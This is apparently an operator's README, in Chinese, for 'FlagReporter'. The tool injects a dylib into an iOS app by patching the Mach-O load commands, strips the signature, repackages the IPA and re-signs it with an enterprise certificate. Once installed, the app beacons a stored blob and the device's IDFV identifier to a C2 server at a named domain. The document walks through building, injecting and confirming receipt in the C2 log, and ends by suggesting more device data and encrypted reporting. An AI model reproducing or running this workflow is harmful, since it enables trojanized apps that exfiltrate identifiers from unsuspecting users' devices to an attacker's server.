# FlagReporter dylib 注入方案

## 概述

此方案通过向 IPA 注入自定义 dylib，实现读取 `flag` 文件并向 C2 服务器发送 POST 请求的功能。

## 文件清单

| 文件 | 说明 |
|------|------|
| `FlagReporter.m` | dylib 源代码 (Objective-C) |
| `build_macos.sh` | macOS 编译脚本 |
| `inject_dylib.py` | Mach-O 二进制修改工具 (Linux 可运行) |
| `repackage_ipa.py` | IPA 重打包主脚本 |

## 工作流程

```
┌─────────────────────────────────────────────────────────┐
│  1. 在 macOS 上编译 dylib                                │
│     ./build_macos.sh → FlagReporter.dylib                │
└────────────────────┬────────────────────────────────────┘
                     │ 复制到 Linux
                     ▼
┌─────────────────────────────────────────────────────────┐
│  2. 在 Linux 上重打包 IPA                                │
│     python3 repackage_ipa.py input.ipa output.ipa URL    │
│                                                          │
│     内部流程:                                            │
│     ├─ 解压 IPA                                          │
│     ├─ 复制 dylib → Frameworks/                          │
│     ├─ 修改主二进制 (添加 LC_LOAD_DYLIB)                 │
│     ├─ 写入 flag 文件                                    │
│     └─ 清除签名 → 重打包                                 │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│  3. 企业签名平台重签名 → 安装到设备                       │
│                                                          │
│  App 启动 → dylib 加载 → 读取 flag → POST /report        │
└─────────────────────────────────────────────────────────┘
```

## dylib 功能

`FlagReporter.dylib` 在加载时自动执行:

1. 读取 App bundle 中的 `flag` 文件
2. 解析格式: `<blob>----6----<report_url>`
3. 构造 POST 请求:
   ```
   POST /report HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   flag=<blob>&device_id=<IDFV>
   ```
4. 发送到 `flag` 文件中指定的 URL

## 使用步骤

### Step 1: 在 macOS 上编译 dylib

```bash
# 1. 将整个 flag_report_dlib 目录复制到 macOS
# 2. 在 macOS 终端执行:
cd flag_report_dlib
chmod +x build_macos.sh
./build_macos.sh

# 3. 将编译好的 FlagReporter.dylib 复制回 Linux:
scp FlagReporter.dylib root@your-server:/www/wwwroot/chain2/backend_c2/flag_report_dlib/
```

**前提条件**:
- macOS + Xcode 命令行工具 (`xcode-select --install`)
- iOS SDK (Xcode 自带)

### Step 2: 在 Linux 上重打包 IPA

```bash
cd /www/wwwroot/chain2/backend_c2/flag_report_dlib

# 确认 dylib 存在
ls -la FlagReporter.dylib

# 重打包 IPA
python3 repackage_ipa.py \
    ~/Downloads/165454_plugin2.ipa \
    ~/Downloads/165454_patched.ipa \
    https://chain.8848exchange.cc.cd
```

### Step 3: 企业签名 + 安装

1. 将 `165454_patched.ipa` 上传到企业签名平台
2. 使用企业证书重签名
3. 安装到 iOS 设备
4. 启动 App

### Step 4: 验证

```bash
# 在 Linux 服务器上查看 C2 日志
tail -f /www/wwwroot/chain2/backend_c2/c2.log

# 应看到类似输出:
# [HH:MM:SS] POST /report | UA=... | 156B
#   -> saved received/report_XXXXXXXX_HHMMSS_XXXX.bin (156 bytes)
```

## dylib 日志

在 macOS 控制台 (Console.app) 或 Xcode 中查看设备日志:
```
[FlagReporter] dylib loaded, starting flag report...
[FlagReporter] flag file read successfully, length: 156
[FlagReporter] Report URL: https://chain.8848exchange.cc.cd/report
[FlagReporter] Sending POST request to ...
[FlagReporter] Response status code: 200
[FlagReporter] Flag report completed successfully
```

## 故障排除

### dylib 编译失败
```
ERROR: Xcode 命令行工具未安装
```
**解决**: `xcode-select --install`

### inject_dylib.py 报错
```
错误: 不是 64 位 Mach-O 文件
```
**解决**: 确认 IPA 中的主二进制是 arm64 架构

### App 启动后无 POST 请求
1. 检查 dylib 是否成功注入:
   ```bash
   unzip -q patched.ipa -d /tmp/check
   cd /tmp/check/Payload/WebViewShell.app/Frameworks
   ls -la FlagReporter.dylib  # 确认存在
   ```
2. 查看设备日志，搜索 `[FlagReporter]` 前缀
3. 确认网络可达: App 能访问 C2 域名

### 签名问题
注入 dylib 后必须重签名。使用企业签名平台或:
```bash
# macOS 本地签名 (需要开发者证书)
codesign -f -s "iPhone Distribution: ..." --preserve-metadata=entitlements WebViewShell
```

## 技术细节

### Mach-O 修改原理

`inject_dylib.py` 直接操作 Mach-O 二进制文件:

1. 读取 `mach_header_64`，获取 load commands 信息
2. 构造新的 `dylib_command` 结构:
   ```c
   struct dylib_command {
       uint32_t cmd = LC_LOAD_DYLIB;    // 0x0000000C
       uint32_t cmdsize;                 // 24 + strlen(path)
       struct dylib {
           uint32_t name_offset;         // 24 (指向后面的字符串)
           uint32_t timestamp;
           uint32_t current_version;
           uint32_t compatibility_version;
       };
       char name[];                      // @executable_path/Frameworks/FlagReporter.dylib
   };
   ```
3. 在 load commands 区域末尾插入新命令
4. 更新 header 中的 `ncmds` 和 `sizeofcmds`

### dylib 加载路径

使用 `@executable_path/Frameworks/FlagReporter.dylib`:
- iOS App 加载时，dyld 自动解析 `@executable_path`
- 定位到 `WebViewShell.app/Frameworks/FlagReporter.dylib`
- 调用 `__attribute__((constructor))` 标记的初始化函数

## 注意事项

1. **必须在 macOS 上编译 dylib** - Linux 无法编译 iOS 动态库
2. **必须重签名** - 修改二进制后原签名失效
3. **flag 文件必须在 dylib 之前存在** - 本方案通过 `repackage_ipa.py` 同时注入两者
4. **Info.plist 无需修改** - dylib 通过 Mach-O load command 自动加载
5. **NSAppTransportSecurity** - 当前 IPA 已配置允许 HTTP/HTTPS 混合

## 后续扩展

如需修改上报逻辑，编辑 `FlagReporter.m` 后重新编译:
- 修改 POST 字段
- 添加更多设备信息 (型号、iOS 版本等)
- 实现加密上报
- 添加重试机制
